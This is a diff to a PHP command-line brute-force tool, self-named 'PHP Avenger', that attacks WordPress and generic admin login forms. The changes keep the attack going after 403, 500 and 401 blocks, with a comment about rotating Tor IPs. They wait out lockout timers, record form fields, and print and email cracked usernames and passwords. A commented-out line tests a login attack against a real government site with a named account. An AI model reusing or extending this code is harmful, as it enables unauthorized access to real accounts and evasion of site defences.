@@ -124,9 +124,14 @@ class BruteForceController extends Command{
         $ProxySiteList= $input->getOption('proxySiteList');
         $injection      = $input->getOption('injection');
 
+        /*$wp = new WordPress("http://www.museus.gov.br/wp-content/uploads/2014/09/guia_virtual_8primavera.pdf");
+        $returnHtml=$wp->sendDataToLoginWordPress("joao lemgruber","123","http://www.museus.gov.br/");
+        var_dump($returnHtml);
+        exit();*/
+
         if($injection)
         {
-            $output->writeln("<danger>Injection is not effective in brute force in WordPress...</danger>");
+            $output->writeln("<error>Injection is not effective in brute force in WordPress...</error>");
         }
 
         //verify if target is list or one
@@ -183,11 +188,19 @@ class BruteForceController extends Command{
                             //verify if is block and change ip of tor
                             if(($returnHtml['status']=='403')OR($returnHtml['status']=='500')OR($returnHtml['status']=='401')){
                                 //change ip of tor
-                                echo "error";
-                                break;
+                                echo "error ".$returnHtml['status'];
+                                //break;
                             }
 
                             $validateLogon=$wp->validateLogon($returnHtml['body']);
+
+                            // check if exist block for time
+                            $checkBloked=$wp->checkBlockedTime($returnHtml['body']);
+                            if($checkBloked)
+                            {
+                                $output->writeln("<error>Site bloked for ".$checkBloked." seconds</error>");
+                                sleep($checkBloked);
+                            }
 
                             if($validateLogon){
 
@@ -212,8 +225,6 @@ class BruteForceController extends Command{
 
                                 break;
                             }
-                            var_dump($returnHtml);
-                            exit();
 
                         }
                     }
@@ -231,7 +242,7 @@ class BruteForceController extends Command{
             }
 
             //PRINT RESULT LIST FINAL
-            $this->printResultWordPress($resultFinal,$output);
+            $this->printResult($resultFinal,$output);
         }
 
 
@@ -301,9 +312,13 @@ class BruteForceController extends Command{
                 //$resultIsAdmin=true;
                 if($resultIsAdmin)
                 {
-                    $usernameField  = $site->getNameFieldUsername();
-                    $passwordField  = $site->getNameFieldPassword();
                     $actionForm     = $site->getActionForm();
+
+                    $usernameField  = $site->getNameFieldUsername($actionForm);
+                    //var_dump($usernameField);
+                    $passwordField  = $site->getNameFieldPassword($actionForm);
+                    //var_dump($passwordField);
+                    //exit();
                     $methodForm     = $site->getMethodForm();
 
                     $excludeValues[]=$usernameField;
@@ -315,20 +330,26 @@ class BruteForceController extends Command{
                     {
                         $otherFields[$actionForm]=array();
                     }
+
                     $resultOfBruteForce=$site->bruteForceAll($actionForm,$methodForm,$usernameField,$passwordField,$otherFields[$actionForm]);
 
                     if($resultOfBruteForce)
                     {
+
                         $output->writeln("");
                         $output->writeln("<info>Login success</info>");
                         $output->writeln("<info>Target: ".$valueTarget."</info>");
-                        $output->writeln("<info>Username: ".$resultOfBruteForce['username']."</info>");
-                        $output->writeln("<info>Password: ".$resultOfBruteForce['password']."</info>");
+                        $output->writeln("<info>Action : ".$actionForm."</info>");
+                        $output->writeln("<info>Username-> Field : ".key($usernameField)." - Value: ".$resultOfBruteForce['username']."</info>");
+                        $output->writeln("<info>Password-> Field : ".key($passwordField)." - Value: ".$resultOfBruteForce['password']."</info>");
 
                         $resultFinal[0]['target']=$valueTarget;
+                        $resultFinal[0]['usernameField']=key($usernameField);
                         $resultFinal[0]['username']=$resultOfBruteForce['username'];
+                        $resultFinal[0]['passwordField']=key($passwordField);
                         $resultFinal[0]['password']=$resultOfBruteForce['password'];
-                        var_dump($resultFinal);
+                        $resultFinal[0]['action']=$actionForm;
+
                         if(isset($resultOfBruteForce['obs']))
                         {
                             $resultFinal[0]['obs']=$resultOfBruteForce['obs'];
@@ -336,6 +357,8 @@ class BruteForceController extends Command{
                         if($email){
                             $this->sendMailWordPress($resultFinal);
                         }
+                        //PRINT RESULT LIST FINAL
+                        $this->printResult($resultFinal,$output);
 
                     }
                     //
@@ -345,6 +368,7 @@ class BruteForceController extends Command{
                 }
                 $oldTargets[]=$baseUrl;
             }
+
         }
     }
 
@@ -454,8 +478,11 @@ class BruteForceController extends Command{
             $msg = "PHP Avenger Informer final, list of SUCCESS:<br><br>";
             foreach($resultFinal as $result){
                 $msg.= "Target =".$result['target']."<br>";
+                $msg.= "Username Field =".$result['usernameField']."<br>";
                 $msg.= "Username =".$result['username']."<br>";
+                $msg.= "Password Field =".$result['passwordField']."<br>";
                 $msg.= "Password =".$result['password']."<br>";
+                $msg.= "Action =".$result['action']."<br>";
                 if(isset($result['obs'])){
                     $msg.= "Obeservation =".$result['obs']."<br>";
                 }
@@ -464,12 +491,12 @@ class BruteForceController extends Command{
         }
     }
 
-    protected function printResultWordPress($resultFinal,$output){
+    protected function printResult($resultFinal,$output){
         $output->writeln("");
 
         $table = new Table($output);
 
-        $table->setHeaders(array('TARGET','USERNAME', 'PASSWORD'));
+        $table->setHeaders(array('TARGET','FIELD USERNAME', 'USERNAME','FIELD PASSWORD', 'PASSWORD'));
 
         $table->setRows($resultFinal);
         $table->render();
